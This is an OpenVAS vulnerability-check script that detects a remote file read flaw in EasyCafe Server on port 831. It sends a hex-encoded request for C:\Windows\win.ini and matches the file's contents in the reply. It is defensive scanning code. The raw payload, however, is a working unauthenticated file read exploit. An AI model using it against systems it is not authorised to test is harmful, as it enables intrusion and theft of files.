##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_easycafe_server_remote_file_read.nasl 11523 2018-09-21 13:37:35Z asteins $
#
# EasyCafe Server Remote File Read Vulnerability
#
# Authors:
# Tushar Khelge <ktushar@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806927");
  script_version("$Revision: 11523 $");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-21 15:37:35 +0200 (Fri, 21 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-01-04 12:52:08 +0530 (Mon, 04 Jan 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("EasyCafe Server Remote File Read Vulnerability");

  script_tag(name:"summary", value:"The host is running EasyCafe Server and is
  prone to a Remote File Read Vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via tcp port and
  checks whether it is able to retrieve file or not.");

  script_tag(name:"insight", value:"The flaw is due to a remote attacker
  connecting to port 831 and can retrieve a file because the server does not validate
  the request, and it does not check if it has sent the UDP/TCP request which gives
  us full Read access to the system.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to connect to the port and retrieve a file and gives full access to
  the system.");

  script_tag(name:"affected", value:"EasyCafe Server version 2.2.14 and
  earlier");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Dec/120");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 831);
  exit(0);
}

easyPort = 831;

if(!get_port_state(easyPort)){
  exit(0);
}

easySock = open_sock_tcp(easyPort);
if(!easySock){
  exit(0);
}

payload = raw_string(0x43, 0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e, 0x64,
                     0x6f, 0x77, 0x73, 0x5c, 0x77, 0x69, 0x6e, 0x2e,
                     0x69, 0x6e, 0x69) +
          crap(length:237, data:raw_string(0x00)) +
          raw_string(0x01, 0x00, 0x00, 0x00, 0x01);

send(socket:easySock, data:payload);
Recv = recv(socket:easySock, length:1000);

if("; for 16-bit app support" >< Recv && "[extensions]" >< Recv)
{
  security_message(port:easyPort);
  exit(0);
}
